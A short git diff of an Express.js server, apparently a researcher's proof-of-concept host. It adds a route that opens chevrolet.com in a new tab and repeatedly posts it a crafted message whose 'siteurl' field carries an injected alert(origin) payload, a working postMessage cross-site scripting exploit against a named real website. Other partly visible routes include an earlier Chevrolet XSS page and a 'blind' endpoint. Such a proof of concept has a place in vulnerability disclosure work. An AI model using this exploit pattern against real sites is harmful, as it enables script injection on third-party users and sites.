@@ -36,7 +36,15 @@ app.get("/chevroletXSS", function (req, res) {
    </script>`);
 });
 
+app.get("/chevroletSecondXSS", function (req, res) {
+   res.send(`<script>
+  let tab =  window.open('https://www.chevrolet.com/');
 
+setInterval(()=>{
+tab.postMessage(\`{"nonMP":"false","siteurl":"https://missoumsaid.com/test?input=alert(origin);////","lang":"ar","currency":"ddd","action":"sss","country":"ddd"}\`,"*")
+}, 2000);
+   </script>`);
+});
     
 app.get("/blind", function (req, res) {
   const forwarded = req.headers["x-forwarded-for"];
